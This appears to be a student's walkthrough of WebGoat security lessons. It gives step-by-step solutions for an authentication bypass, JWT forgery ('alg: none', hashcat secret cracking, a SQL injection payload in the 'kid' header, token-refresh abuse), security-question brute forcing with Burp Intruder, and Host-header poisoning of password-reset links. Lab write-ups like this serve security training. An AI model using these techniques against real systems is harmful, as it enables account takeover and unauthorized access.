# Authentication Bypass
### 2
	Method from the story doesn't work.
	But tempering with the names of the variables does.
	Change variable names to 'SecurityQuestionA' and 'SecurityQuestionB'.

# JWT Tokens
### 3
	Paste token to the WebWolf JWT tab and find name "user".
### 5
	Eavesdrop JWT from Tom.
	Put it to WebWolf and change:
	1. {
		"alg" : null
		}
	2. {
		"admin" : "true",
		"iat" : 1649869119, # this may be different
		"user" : "Tom"
		}

### 7
http://javadox.com/io.jsonwebtoken/jjwt/0.4/io/jsonwebtoken/JwtParser.html#parseClaimsJws-java.lang.String-
http://javadox.com/io.jsonwebtoken/jjwt/0.4/io/jsonwebtoken/JwtParser.html#parse-java.lang.String-

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0. = 
{
  "alg" : "none",
  "typ" : "JWT"
}
{
  "admin" : true,
  "iat" : 1516239022,
  "sub" : "1234567890",
  "user" : "John Doe"
}

1. Solution 1
2. Solution 3

### 8
Looked for dictionary: https://github.com/first20hours/google-10000-english

hashcat --force -m 16500 <token> google-10000-english.txt.
while knowing secret key: https://jwt.io/.
change username to WebGoat and change expiration date.
paste secret key in the bottom, without "secret base64 encoded".
copy "encoded" field.

### 10
open page 10 while in burp's browser
go to http history
find http://localhost:8080/WebGoat/JWT/refresh/login
find
Jerry:
{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}
and
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "OxTyJabcgcphndIYFhXB"
}

Tom:
{
	token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
}
now create request, request must have:
- POST request - @PostMapping
- Authorization header - Tom’s access token from the given log entries
- Content-Type header - 'application/json'
- data in JSON format access and refresh tokens - Jerry’s tokens copied straight from the /login endpoint response
- current JESSIONID
  
so for example:
POST /WebGoat/JWT/refresh/newToken HTTP/1.1
Host: localhost:8080
Content-Length: 223
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
Content-Type: application/json
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Linux"
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/WebGoat/start.mvc
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=JvEkLZzu6hJuRITdAYRWW3U51wFko7S4wOSoieys
Connection: close

{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "OxTyJabcgcphndIYFhXB"
}

I got back 

{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg",
  "refresh_token" : "XkuwXVEsoUNdtwejywFz"
}

then send to repeater some POST checkout:

### 11
Open browser from Burp.

by clicking Delete we get request:

POST /WebGoat/JWT/final/delete?token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8 HTTP/1.1

In the code for this lesson.
```
ResultSet rs = connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'");
```

base64("new_key") = "bmV3X2tleQ=="

So we need to put something like as 'kid':
' UNION SELECT 'bmV3X2tleQ==' FROM jwt_keys; --

and produce jwt in jwt.io, also verify signature with:
! remeber to change names from jerry to tom in jwt.io

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
new_key

) secret base64 encoded

and then send it via Repeater

# Password Reset
### 2 
send email to WebWolf
login with 'leirbag'


### 4 
- open burp
- try to login while intercepting
- put it into intruder
- select **cluster bomb** type
- payload set 1:
  - tom
  - larry
  - admin
- payload set 2:
  - red
  - green
  - black
  - white
  - pink
  - orange
  - blue
  - gray
  - yellow
  - brown

answers: 
- larry; yellow
- admin; green


### 6
- via Burp
- use tom mail in the form 
- intercept resetPassword message
- change Host header to "localhost:9090"
- open WebWOlf
- go to Incoming Requests
- copy uri of last request
- change port to 8080 and add /WebGoat after
- paste link
- than you can login

# Secure Passwords
# 4 
"Just because you shot Jesse James doesn't mean you are Jesse James." - JbysJJdmyaJJ
